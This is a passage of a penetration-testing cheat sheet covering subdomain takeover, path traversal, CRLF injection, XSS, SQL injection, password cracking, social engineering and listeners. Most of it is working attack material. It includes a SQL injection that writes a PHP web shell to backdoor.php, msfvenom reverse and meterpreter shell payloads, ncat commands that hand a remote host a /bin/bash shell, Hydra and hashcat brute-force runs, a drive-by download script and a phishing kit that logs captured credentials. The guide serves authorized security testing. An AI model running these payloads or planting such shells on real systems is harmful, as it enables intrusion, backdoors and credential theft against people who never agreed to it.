grep 'NOERROR' subdomains_to_status.txt | grep -Po '[^\s]+(?=\ \|)' | sort -uf | tee -a subdomains_error_none.txt
```

You can double check if domains/subdomains are dead or not with [httpx](#httpx).

Check if hosting providers for the found domains/subdomains are vulnerable to domain/subdomain takeover at [EdOverflow/can-i-take-over-xyz](https://github.com/EdOverflow/can-i-take-over-xyz). Credits to the author!

### Subzy

To download and install the tool, run:

```bash
go install -v github.com/lukasikic/subzy@latest
```

Check if you can takeover domains/subdomains:

```fundamental
subzy -concurrency 100 -timeout 3 -targets subdomains.txt | tee subzy_results.txt
```

### subjack

To download and install the tool, run:

```bash
go install -v github.com/haccer/subjack@latest
```

Check if you can takeover domains/subdomains:

```fundamental
subjack -v -o subjack_results.json -t 100 -timeout 3 -a -m -w subdomains.txt
```

### Nuclei

Installation:

```bash
apt-get update && apt-get install -y nuclei
```

Download the latest [Nuclei templates](https://github.com/projectdiscovery/nuclei-templates/releases).

To download and/or update Nuclei templates:

```bash
mkdir -p ~/nuclei-templates && nuclei -ut ~/nuclei-templates
```

Vulnerability scan (all templates):

```fundamental
nuclei -c 500 -o nuclei_results.txt -l subdomains_live.txt

cat nuclei_results.txt | grep -Po '(?<=\]\ ).+' | sort -uf > nuclei_sorted_results.txt
```

Only subdomain takeover:

```fundamental
nuclei -c 500 -t ~/nuclei-templates/takeovers -o nuclei_takeover_results.txt -l subdomains_live.txt
```

### dotdotpwn

Traverse a path (e.g. `somesite.com/../../etc/shadow`):

```fundamental
dotdotpwn -m http -f /etc/passwd -k root -h somesite.com

dotdotpwn -m http -S -f /windows/win.ini -k mci -h somesite.com

dotdotpwn -m http-url -f /etc/hosts -k localhost -u 'https://somesite.com/index.php?file=TRAVERSAL'

dotdotpwn -m http-url -f /etc/hosts -k localhost -u 'https://somesite.com/index.php?file=file://TRAVERSAL'
```

Try to prepend a protocol such as `file://`, `gopher://`, `dict://`, `php://`, `jar://`, `tftp://`, etc. to the file path.

Check some additional directory traversal tips at [swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Directory%20Traversal/README.md). Credits to the author!

| Option | Description |
| --- | --- |
| -m | Module (http, http-url, ftp, tftp payload, stdout) |
| -h | Hostname |
| -O | Operating System detection for intelligent fuzzing (nmap) |
| -o | Operating System type if known ("windows", "unix", or "generic") |
| -d | Depth of traversals (default: 6) |
| -f | Specific filename (default: according to OS detected) |
| -S | Use SSL for HTTP and Payload module (not needed for http-url) |
| -u | URL with the part to be fuzzed marked as TRAVERSAL |
| -k | Text pattern to match in the response |
| -p | Filename with the payload to be sent and the part to be fuzzed marked with the TRAVERSAL keyword |
| -x | Port to connect (default: HTTP=80; FTP=21; TFTP=69) |
| -U | Username (default: 'anonymous') |
| -P | Password (default: 'dot(at)dot.pwn') |
| -M | HTTP Method to use when using the 'http' module (GET, POST, HEAD, COPY, MOVE, default: GET) |
| -b | Break after the first vulnerability is found |
| -C | Continue if no data was received from host |

### HTTP Response Splitting

Also known as CRLF injection. CRLF refers to carriage return (`ASCII 13`, `\r`) and line feed (`ASCII 10`, `\n`).

Fixate a session cookie:

```fundamental
somesite.com/redirect.asp?origin=somesite.com%0D%0ASet-Cookie:%20ASPSESSION=123456789
```

When encoded, `\r` refers to `%0D` and `\n` refers to `%0A`.

Session fixation is one of many techniques used in combination with HTTP response splitting. Search the Internet for more information.

### Cross-Site Scripting (XSS)

Simple cross-site scripting (XSS) examples:

```html
<script>alert(1)</script>

<script src="https://myserver.com/xss.js"></script>

<img src="https://github.com/favicon.ico" onload="alert(1)">
```

Hosting JavaScript on [Pastebin](https://pastebin.com) doesn't work because Pastebin returns the plain text content type.

Find out more about reflected and stored cross-site scripting (XSS) attacks, as well as cross-site request forgery (XSRF/CSRF) attacks from my other [project](https://github.com/ivan-sincek/xss-catcher).

Valid emails with embedded XSS:

```html
user+(<script>alert(1)</script>)@somedomain.com

user@somedomain(<script>alert(1)</script>).com

"<script>alert(1)</script>"@somedomain.com
```

### SQL Injection

**The following examples were tested on MySQL database.**

Try to produce database errors by injecting a single-quote, back-slash, double-hyphen, forward-slash, or period.

Boolean-based SQLi:

```fundamental
' OR 1=1-- 

' OR 1=2-- 
```

**Note that MySQL requires a space between the comment symbol and the next character.**

Union-based SQLi:

```fundamental
' UNION SELECT 1, 2, 3, 4-- 

' UNION SELECT 1, concat_ws(' | ', database(), current_user(), version()), 3, 4-- 

' UNION SELECT 1, concat_ws(' | ', table_schema, table_name, column_name, data_type, character_maximum_length), 3, 4 FROM information_schema.columns-- 

' UNION SELECT 1, load_file('..\\..\\apache\\conf\\httpd.conf'), 3, 4-- 
```

Use the union-based SQLi only when you are able to use the same communication channel to both launch the attack and gather results.

The goal is to determine the exact number of columns in the application query and to figure out which of them are displaying to the user.

Time-based SQLi:

```fundamental
' AND (SELECT 1 FROM (SELECT sleep(2)) test)-- 

' AND (SELECT 1 FROM (SELECT CASE user() WHEN 'root@127.0.0.1' THEN sleep(2) ELSE sleep(0) END) test)-- 

' AND (SELECT 1 FROM (SELECT CASE substring(current_user(), 1, 1) WHEN 'r' THEN sleep(2) ELSE sleep(0) END) test)-- 

' AND (SELECT CASE substring(password, 1, 1) WHEN '$' THEN sleep(2) ELSE sleep(0) END FROM schema.users WHERE id = 1)-- 

' AND IF(version() LIKE '5%', sleep(2), sleep(0))-- 
```

Use the time-based SQLi when you are not able to see the results.

Inject a [simple PHP web shell](https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/web/simple_php_web_shell_get.php) based on HTTP GET request:

```fundamental
' UNION SELECT '', '', '', '<?php $p="command";$o=null;if(isset($_SERVER["REQUEST_METHOD"])&&strtolower($_SERVER["REQUEST_METHOD"])==="get"&&isset($_GET[$p])&&($_GET[$p]=trim($_GET[$p]))&&strlen($_GET[$p])>0){$o=@shell_exec("($_GET[$p]) 2>&1");if($o===false){$o="ERROR: The function might be disabled.";}else{$o=str_replace("<","&lt;",$o);$o=str_replace(">","&gt;",$o);}/*echo "<pre>{$o}</pre>";unset($o);unset($_GET[$p]);/*@gc_collect_cycles();*/} ?><!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>Simple PHP Web Shell</title><meta name="author" content="Ivan Šincek"><meta name="viewport" content="width=device-width, initial-scale=1.0"></head><body><pre><?php echo $o;unset($o);unset($_GET[$p]);/*@gc_collect_cycles();*/ ?></pre></body></html>' INTO DUMPFILE '..\\..\\htdocs\\backdoor.php'-- 
```

To successfully inject a web shell, the current database user must have a write permission.

**Always make sure to properly close the surrounding code.**

Read this [article](https://owasp.org/www-community/attacks/SQL_Injection_Bypassing_WAF) to learn how to bypass WAF.

### sqlmap

Inject SQL code into request parameters:

```fundamental
sqlmap -a -u somesite.com/index.php?username=test&password=test

sqlmap -a -u somesite.com/index.php --data username=test&password=test

sqlmap -a -u somesite.com/index.php --data username=test&password=test -p password
```

| Option | Description |
| --- | --- |
| -u | Target URL |
| -H | Extra HTTP header |
| --data | Data string to be sent through POST |
| --cookie | HTTP Cookie header value |
| --proxy | Use a proxy to connect to the target URL (\[protocol://\]host\[:port\]) |
| -p | Testable parameter(s) |
| --level | Level of tests to perform (1-5, default: 1) |
| --risk | Risk of tests to perform (1-3, default: 1) |
| -a | Retrieve everything |
| -b | Retrieve DBMS banner |
| --dump-all | Dump all DBMS databases tables entries |
| --os-shell | Prompt for an interactive operating system shell |
| --os-pwn | Prompt for an OOB shell, Meterpreter, or VNC |
| --sqlmap-shell | Prompt for an interactive sqlmap shell |
| --wizard | Simple wizard interface for beginner users |

### Web Shells

Find out more about PHP shells from my other [project](https://github.com/ivan-sincek/php-reverse-shell).

Find out more about Java/JSP shells from my other [project](https://github.com/ivan-sincek/java-reverse-tcp).

### Send Payload With Python

Find out how to generate a `reverse shell payload` for Python and send it to a target machine from my other [project](https://github.com/ivan-sincek/send-tcp-payload).

## 4. Post Exploitation

### 4.1 Useful Websites

* [swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
* [lolbas-project.github.io](https://lolbas-project.github.io)
* [gtfobins.github.io](https://gtfobins.github.io)

### Generate a Reverse Shell Payload for Windows OS

To generate a `Base64 encoded payload`, use one of the following MSFvenom commands (modify them to your need):

```fundamental
msfvenom --platform windows -a x86 -e x86/call4_dword_xor -p windows/shell_reverse_tcp LHOST=192.168.8.5 LPORT=9000 EXITFUNC=thread -f raw -b \x00\x0a\x0d\xff | base64 -w 0 > payload.txt

msfvenom --platform windows -a x64 -e x64/xor -p windows/x64/shell_reverse_tcp LHOST=192.168.8.5 LPORT=9000 EXITFUNC=thread -f raw -b \x00\x0a\x0d\xff | base64 -w 0 > payload.txt

msfvenom --platform windows -a x86 -e x86/call4_dword_xor -p windows/meterpreter_reverse_tcp LHOST=192.168.8.5 LPORT=9000 EXITFUNC=thread -f raw | base64 -w 0 > payload.txt

msfvenom --platform windows -a x64 -e x64/xor -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.8.5 LPORT=9000 EXITFUNC=thread -f raw | base64 -w 0 > payload.txt
```

To generate a `binary file`, use one of the following MSFvenom commands (modify them to your need):

```fundamental
msfvenom --platform windows -a x86 -e x86/call4_dword_xor -p windows/shell_reverse_tcp LHOST=192.168.8.5 LPORT=9000 EXITFUNC=thread -f raw -b \x00\x0a\x0d\xff -o payload.bin

msfvenom --platform windows -a x64 -e x64/xor -p windows/x64/shell_reverse_tcp LHOST=192.168.8.5 LPORT=9000 EXITFUNC=thread -f raw -b \x00\x0a\x0d\xff -o payload.bin

msfvenom --platform windows -a x86 -e x86/call4_dword_xor -p windows/meterpreter_reverse_tcp LHOST=192.168.8.5 LPORT=9000 EXITFUNC=thread -f raw -o payload.bin

msfvenom --platform windows -a x64 -e x64/xor -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.8.5 LPORT=9000 EXITFUNC=thread -f raw -o payload.bin
```

To generate a `DLL file`, use one of the following MSFvenom commands (modify them to your need):

```fundamental
msfvenom --platform windows -a x86 -e x86/call4_dword_xor -p windows/shell_reverse_tcp LHOST=192.168.8.5 LPORT=9000 EXITFUNC=thread -f dll -b \x00\x0a\x0d\xff -o payload.dll

msfvenom --platform windows -a x64 -e x64/xor -p windows/x64/shell_reverse_tcp LHOST=192.168.8.5 LPORT=9000 EXITFUNC=thread -f dll -b \x00\x0a\x0d\xff -o payload.dll
```

To generate a `standalone executable`, file use one of the following MSFvenom commands (modify them to your need):

```fundamental
msfvenom --platform windows -a x86 -e x86/call4_dword_xor -p windows/shell_reverse_tcp LHOST=192.168.8.5 LPORT=9000 EXITFUNC=thread -f exe -b \x00\x0a\x0d\xff -o payload.exe

msfvenom --platform windows -a x64 -e x64/xor -p windows/x64/shell_reverse_tcp LHOST=192.168.8.5 LPORT=9000 EXITFUNC=thread -f exe -b \x00\x0a\x0d\xff -o payload.exe

msfvenom --platform windows -a x86 -e x86/call4_dword_xor -p windows/meterpreter_reverse_tcp LHOST=192.168.8.5 LPORT=9000 EXITFUNC=thread -f exe -o payload.exe

msfvenom --platform windows -a x64 -e x64/xor -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.8.5 LPORT=9000 EXITFUNC=thread -f exe -o payload.exe
```

To generate an `MSI file`, use one of the following MSFvenom commands (modify them to your need):

```fundamental
msfvenom --platform windows -a x86 -e x86/call4_dword_xor -p windows/shell_reverse_tcp LHOST=192.168.8.5 LPORT=9000 EXITFUNC=thread -f msi -b \x00\x0a\x0d\xff -o payload.msi

msfvenom --platform windows -a x64 -e x64/xor -p windows/x64/shell_reverse_tcp LHOST=192.168.8.5 LPORT=9000 EXITFUNC=thread -f msi -b \x00\x0a\x0d\xff -o payload.msi
```

Bytecode might not work on the first try due to some other bad characters. Trial and error is the key.

So far there is no easy way to generate a DLL nor MSI file with a stageless meterpreter shell due to the size issues.

### PowerShell Encoded Command

To generate a PowerShell encoded command from a PowerShell script, run the following PowerShell command:

```pwsh
[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes([IO.File]::ReadAllText($script)))
```

To run the PowerShell encoded command, run the following command from either PowerShell or Command Prompt:

```pwsh
PowerShell -ExecutionPolicy Unrestricted -NoProfile -EncodedCommand $command
```

To decode a PowerShell encoded command, run the following PowerShell command:

```pwsh
[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($command))
```

Find out more about PowerShell reverse and bind TCP shells from my other [project](https://github.com/ivan-sincek/powershell-reverse-tcp).

## 5. Password Cracking

**Google a hash before trying to crack it because you might save yourself a lot of time and trouble.**

Use [Google Dorks](#google-dorks), [Chad](https://github.com/ivan-sincek/chad), or [FOCA](#foca) to find files and within file's metadata domain usernames to brute force.

**Keep in mind that you might lockout people's accounts.**

Keep in mind that some web forms implement CAPTCHA and/or hidden submission tokens which may prevent you from brute forcing. Try to submit requests without tokens or CAPTCHA.

You can find a bunch of wordlists in [SecLists](#wordlists).

### 5.1 Useful Websites

* [gchq.github.io/CyberChef](https://gchq.github.io/CyberChef)
* [onlinehashcrack.com](https://www.onlinehashcrack.com)
* [hashkiller.io/listmanager](https://hashkiller.io/listmanager) (has many other tools)
* [hashes.com/en/decrypt/hash](https://hashes.com/en/decrypt/hash) (has many other tools)
* [crackstation.net](https://crackstation.net)
* [weakpass.com/wordlist](https://weakpass.com/wordlist) (lots of password dumps)
* [packetstormsecurity.com/Crackers/wordlists](https://packetstormsecurity.com/Crackers/wordlists)

### crunch

Generate a lower-alpha-numeric wordlist:

```fundamental
crunch 4 6 -f /usr/share/crunch/charset.lst lalpha-numeric -o crunch_wordlist.txt
```

You can see the list of all available charsets or add your own in `charset.lst` located at `/usr/share/crunch/` directory.

Generate all the possible permutations for specified words:

```fundamental
crunch -o crunch_wordlist.txt -p admin 123 \!\"

crunch -o crunch_wordlist.txt -q words.txt
```

Generate all the possible combinations for a specified charset:

```fundamental
crunch 4 6 -o crunch_wordlist.txt -p admin123\!\"
```

| Option | Description |
| --- | --- |
| -d | Limits the number of consecutive characters |
| -f | Specifies a character set from a file |
| -i | Inverts the output |
| -l | When you use the -t option this option tells crunch which symbols should be treated as literals |
| -o | Specifies the file to write the output to |
| -p | Tells crunch to generate/permute words that don't have repeating characters |
| -q | Tells crunch to read a file and permute what is read |
| -r | Tells crunch to resume generate words from where it left off, -r only works if you use -o |
| -s | Specifies a starting string |
| -t | Specifies a pattern |

| Placeholder | Description |
| --- | --- |
| \@ | Lower case characters |
| \, | Upper case characters |
| \% | Numbers |
| \^ | Symbols |

**Unfortunately, there is no placeholder ranging from lowercase-alpha to symbols.**

Generate all the possible combinations for a specified placeholder:

```fundamental
crunch 10 10 -o crunch_wordlist.txt -t admin%%%^^

crunch 10 10 -o crunch_wordlist.txt -t admin%%%^^ -d 2% -d 1^

crunch 10 10 + + 123456 \!\" -o crunch_wordlist.txt -t admin@@%^^

crunch 10 10 -o crunch_wordlist.txt -t @dmin@@%^^ -l @aaaaaaaaa
```

### hash-identifier

To identify a hash type, run the following tool:

```fundamental
hash-identifier
```

### Hashcat

Brute force MD5 hashes:

```fundamental
hashcat -m 0 -a 3 --session=cracking --force --status -O -o hashcat_results.txt hashes.txt
```

Brute force NetNTLMv1 hashes:

```fundamental
hashcat -m 5500 -a 3 --session=cracking --force --status -O -o hashcat_results.txt hashes.txt
```

Use `--session=<session_name>` so that you can continue your cracking progress later on with `--restore`.

Continue cracking progress:

```fundamental
hashcat --session=cracking --restore
```

| Option | Description |
| --- | --- |
| -m | Hash-type, see references below |
| -a | Attack-mode, see references below |
| --force | Ignore warnings |
| --runtime | Abort session after X seconds of runtime |
| --status | Enable automatic update of the status screen |
| -o | Define outfile for recovered hash |
| --show | Show cracked passwords found in potfile |
| --session | Define specific session name |
| --restore | Restore session from --session |
| --restore-file-path | Specific path to restore file |
| -O | Enable optimized kernels (limits password length) |
| -1 | User-defined charset ?1 |
| -2 | User-defined charset ?2 |
| -3 | User-defined charset ?3 |
| -4 | User-defined charset ?4 |

**When specifying a user-defined charset, escape `?` with another `?` (i.e. use `??` instead of `\?`).**

| Hash Type | Description |
| --- | --- |
| 0 | MD5 |
| 100 | SHA1 |
| 1400 | SHA256 |
| 1700 | SHA512 |
| 200  | MySQL323 |
| 300  | MySQL4.1/MySQL5 |
| 1000 | NTLM |
| 5500 | NetNTLMv1-VANILLA / NetNTLMv1-ESS |
| 5600 | NetNTLMv2 |
| 2500 | WPA/WPA2 |
| 16800 | WPA-PMKID-PBKDF2 |

For more hash types read the manual.

| Attack Mode | Name |
| --- | --- |
| 0 | Straight |
| 1 | Combination |
| 2 | Toggle Case |
| 3 | Brute Force |
| 4 | Permutation |
| 5 | Table Lookup |
| 8 | Prince |

| Charset | Description |
| --- | --- |
| \?l | abcdefghijklmnopqrstuvwxyz |
| \?u | ABCDEFGHIJKLMNOPQRSTUVWXYZ |
| \?d | 0123456789 |
| \?s | \!\"\#\$\%\&\'\(\)\*\+\,\-\.\/\:\;\<\=\>\?\@\[\]\^\_\`\{\|\}\~ |
| \?a | \?l\?u\?d\?s |
| \?b | 0x00 - 0xff |

Dictionary attack:

```fundamental
hashcat -m 100 -a 0 --session=cracking --force --status -O B1B3773A05C0ED0176787A4F1574FF0075F7521E rockyou.txt

hashcat -m 5600 -a 0 --session=cracking --force --status -O -o hashcat_results.txt hashes.txt rockyou.txt
```

You can find `rockyou.txt` wordlist in [SecLists](#wordlists).

Brute force a hash with a specified placeholder:

```fundamental
hashcat -m 0 -a 3 --session=cracking --force --status -O cc158fa2f16206c8bd2c750002536211 -1 ?l?u -2 ?d?s ?1?l?l?l?l?l?2?2

hashcat -m 0 -a 3 --session=cracking --force --status -O 85fb9a30572c42b19f36d215722e1780 -1 \!\"\#\$\%\&\/\(\)\=??\* -2 ?d?1 ?u?l?l?l?l?2?2?2
```

### Hydra

Crack an HTTP POST web form login:

```fundamental
hydra -o hydra_results.txt -l admin -P rockyou.txt somesite.com http-post-form '/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed!'
```

When cracking a web form login, you must specify `Login=Login:<expected_message>` to distinguish between a successful login and a failed one. Each expected message can vary between web forms.

Keep in mind that the `username` and `password` request parameters can be named differently.

Crack a Secure Shell login:

```fundamental
hydra -o hydra_results.txt -L users.txt -P rockyou.txt 192.168.8.5 ssh
```

You can find a bunch of wordlists in [SecLists](#wordlists).

| Option | Description |
| --- | --- |
| -R | Restore a previous aborted/crashed session |
| -S | Perform an SSL connect |
| -O | Use old SSL v2 and v3 |
| -s | If the service is on a different default port, define it here |
| -l | Login with a login name |
| -L | Load several logins from a file |
| -p | Login with a password |
| -P | Load several passwords from a file |
| -x | Password brute force generation (MIN:MAX:CHARSET), type "-x -h" to get help |
| -y | Disable use of symbols in bruteforce |
| -e | Try "n" null password, "s" login as pass and/or "r" reversed login |
| -o | Write found login/password pairs to a file instead of stdout |
| -f/-F | Exit when a login/pass pair is found (-f per host, -F global) |
| -M | List of servers to attack, one entry per line, ':' to specify port |

| Supported Services |
| --- |
| ftp\[s\] |
| http\[s\]\-\{get\|post\}\-form |
| mysql |
| smb |
| smtp\[s\] |
| snmp |
| ssh |
| telnet\[s\] |
| vnc |

For more supported services read the manual.

| Brute Force Syntax | Description |
| --- | --- |
| MIN | Minimum number of characters in the password |
| MAX | Maximum number of characters in the password |
| CHARSET | Charset values are: "a" for lowercase letters, "A" for uppercase letters, "1" for numbers, and for all others, just add their real representation |

Brute force attack:

```fundamental
hydra -o hydra_results.txt -l admin -x 4:4:aA1\!\"\#\$\% 192.168.8.5 ftp
```

### Password Spraying

After you have collected enough usernames from [reconnaissance phase](1-reconnaissance), it is time to try and crack some of them.

Find out how to generate a good password spraying wordlist from my other [project](https://github.com/ivan-sincek/wordlist-extender), but first you will need a few good keywords that describe your target.

Such keywords can be a company name, abbreviations, words that describe your target's services, products, etc.

After you generate the wordlist, use it with tools such as [Hydra](#hydra), [Burp Suite Intruder](https://portswigger.net/burp/documentation/desktop/tools/intruder/using), etc. to crack web login forms. P.S. Hydra can attack authentication mechanisms on all kinds of services/ports.

If strong password policy is enforced, passwords usually start with one capitalized word followed by a few digits and one special character at the end (e.g. Password123!).

You can also use the generated wordlist with [hashcat](#hashcat), e.g. to crack NTLMv2 hashes that you have collected using LLMNR responder, etc.

## 6. Social Engineering

Find out how to embed a PowerShell script into an MS Word document from my other [project](https://github.com/ivan-sincek/powershell-reverse-tcp#ms-word).

### Drive-by Download

To force users to download a malicious file, copy and paste this JavaScript code block on a cloned web page:

```javascript
function download(url, type, name, method) {
	var req = new XMLHttpRequest();
	req.open(method, url, true);
	req.responseType = 'blob';
	req.onload = function() {
		var blob = new Blob([req.response], { type: type })
		var isIE = false || !!document.documentMode;
		if (isIE) {
			// IE doesn't allow using a blob object directly as link
			// instead it is necessary to use msSaveOrOpenBlob()
			if (window.navigator && window.navigator.msSaveOrOpenBlob) {
				window.navigator.msSaveOrOpenBlob(blob, name);
			}
		} else {
			var anchor = document.createElement('a');
			anchor.href = window.URL.createObjectURL(blob);
			anchor.download = name;
			anchor.click();
			// in Firefox it is necessary to delay revoking the ObjectURL
			setTimeout(function() {
				window.URL.revokeObjectURL(anchor);
				anchor.remove();
			}, 250);
		}
	};
	req.send();
}
// specify your file here, use only an absolute URL
download('http://localhost/files/pentest.pdf', 'application/pdf', 'pentest.pdf', 'GET');
// download('http://localhost/files/pentest.docx', 'plain/txt', 'pentest.docx', 'GET');
```

To try it out, copy all the content from [\\social_engineering\\driveby_download\\](https://github.com/ivan-sincek/penetration-testing-cheat-sheet/tree/master/social_engineering/driveby_download) to your server's web root directory (e.g. to \\xampp\\htdocs\\ on XAMPP), and navigate to the web page with your preferred web browser.

### Phishing Website

To try it out, copy all the content from [\\social_engineering\\phishing_website\\](https://github.com/ivan-sincek/penetration-testing-cheat-sheet/tree/master/social_engineering/phishing_website) to your server's web root directory (e.g. to \xampp\htdocs\ on XAMPP), and navigate to the web page with your preferred web browser.

Captured credentials will be stored in [\\social_engineering\\phishing_website\\logs\\credentials.log](https://github.com/ivan-sincek/penetration-testing-cheat-sheet/tree/master/social_engineering/phishing_website/logs).

<p align="center"><img src="https://github.com/ivan-sincek/penetration-testing-cheat-sheet/blob/master/img/phishing_website.jpg" alt="Phishing Website"></p>

<p align="center">Figure 2 - Phishing Website</p>

---

Read the comments in [\\social_engineering\\phishing_website\\index.php](https://github.com/ivan-sincek/penetration-testing-cheat-sheet/blob/master/social_engineering/phishing_website/index.php) to get a better understanding on how all of it works.

You can modify and expand this template to your liking. You have everything that needs to get you started.

You can easily customize [CSS](https://github.com/ivan-sincek/penetration-testing-cheat-sheet/blob/master/social_engineering/phishing_website/css/main.css) to make it look more like the company you are testing, e.g. change colors, logo, etc.

Check the standalone redirect templates in [\\social_engineering\\phishing_website\\redirects\\](https://github.com/ivan-sincek/penetration-testing-cheat-sheet/blob/master/social_engineering/phishing_website/redirects) directory.

---

Use SingleFile ([Chrome](https://chrome.google.com/webstore/detail/singlefile/mpiodijhokgodhhofbcjdecpffjipkle))([FireFox](https://addons.mozilla.org/hr/firefox/addon/single-file)) browser extension to download a web page as a single HTML file, then, rename the file to `index.php`.

## 7. Miscellaneous

Here you can find a bunch of random stuff.

### 7.1 Useful Websites

* [jsonlint.com](https://jsonlint.com)
* [base64decode.org](https://www.base64decode.org)
* [urldecoder.org](https://www.urldecoder.org)
* [raikia.com/tool-powershell-encoder](https://raikia.com/tool-powershell-encoder)
* [bitly.com](https://bitly.com) (URL shortener)
* [getcreditcardnumbers.com](https://www.getcreditcardnumbers.com) (dummy credit card info)

### cURL

Download a file:

```fundamental
curl somesite.com/somefile.txt -o somefile.txt
```

Upload a file:

```fundamental
curl somesite.com/uploads/ -T somefile.txt
```

Find out how to test a web server for various HTTP methods and method overrides from my other [project](https://github.com/ivan-sincek/forbidden).

| Option | Description |
| --- | --- |
| -d | Sends the specified data in a POST request to the HTTP server |
| -H | Extra header to include in the request when sending HTTP to a server |
| -i | Include the HTTP response headers in the output |
| -k | Proceed and operate server connections otherwise considered insecure |
| -o | Write to file instead of stdout |
| -T | Transfers the specified local file to the remote URL, same as PUT method |
| -v | Make the operation more talkative |
| -x | Use the specified proxy (\[protocol://\]host\[:port\]) |
| -X | Specifies a custom request method to use when communicating with the HTTP server |

### Ncat

[Server] Set up a listener:

```fundamental
ncat -nvlp 9000

ncat -nvlp 9000 > received_data.txt

ncat -nvlp 9000 -e /bin/bash

ncat -nvlp 9000 -e /bin/bash --ssl

ncat -nvlp 9000 --ssl-cert crt.pem --ssl-key key.pem

ncat -nvlp 9000 --keep-open <<< "HTTP/1.1 200 OK\r\n\r\n"
```

[Client] Connect to a remote host:

```fundamental
ncat -nv 192.168.8.5 9000

ncat -nv 192.168.8.5 9000 < sent_data.txt

ncat -nv 192.168.8.5 9000 -e /bin/bash

ncat -nv 192.168.8.5 9000 -e /bin/bash --ssl

ncat -nv 192.168.8.5 9000 --ssl-cert crt.pem --ssl-key key.pem
```

Check if it is possible to connect to a specified TCP port (e.g. port 22 or 23):

```bash
for i in {0..255}; do ncat -nv "192.168.8.${i}" 9000 -w 2 -z 2>&1 | grep -Po '(?<=Connected\ to\ )[^\s]+(?=\.)'; done

for ip in $(cat ips.txt); do ncat -nv "${ip}" 9000 -w 2 -z 2>&1 | grep -Po '(?<=Connected\ to\ )[^\s]+(?=\.)'; done
```

Find out how to create an SSL/TLS certificate from my other [project](https://github.com/ivan-sincek/secure-website/tree/master/crt).

### multi/handler

Set up a listener (change the PAYLOAD, LHOST, and LPORT as necessary):

```fundamental
msfconsole -q

use exploit/multi/handler

set PAYLOAD windows/shell_reverse_tcp

set LHOST 192.168.8.185

set LPORT 9000

exploit
```

### ngrok

Use [ngrok](https://ngrok.com/download) to give your local web server a public address, but do not expose the web server for too long if it is not properly hardened due to security concerns.

I advise you not to transfer any sensitive data over it, just in case.

### Additional References

Credits to the authors!

* [infosecmatter.com/bug-bounty-tips](https://www.infosecmatter.com/bug-bounty-tips)
* [pentestbook.six2dez.com](https://pentestbook.six2dez.com)
